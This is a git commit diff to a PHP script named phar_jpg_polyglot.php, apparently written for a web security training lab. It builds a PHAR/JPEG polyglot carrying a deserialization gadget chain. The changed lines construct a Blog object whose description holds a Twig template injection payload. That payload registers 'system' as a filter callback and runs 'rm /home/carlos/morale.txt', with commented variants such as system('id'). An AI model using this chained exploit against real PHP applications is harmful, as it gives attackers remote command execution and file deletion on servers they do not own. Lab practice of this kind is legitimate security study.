8df11bc0769cd3f56ed3a6fbf5444cd36bde1a21
hoangdat2407 <82460838+hoangdat2407@users.noreply.github.com>
2026-06-16 09:22:50 +0700

    Save phar_jpg_polyglot.php at 2026-06-16 09:22:50

--- phar_jpg_polyglot.php
+++ phar_jpg_polyglot.php
@@ -100,9 +100,8 @@ function generate_polyglot($phar, $jpeg){
 // $object = new PHPObjectInjection;
 // $object->inject = 'system("id");';
 // $object->out = 'Hallo World';
-$blog = new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}");
 
-$object = new CustomTemplate($blog);
+$object = new CustomTemplate(new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}"));
 // $object = new CustomTemplate;
 // $blog = new Blog;
 // $blog->desc = "{{7*7}}";
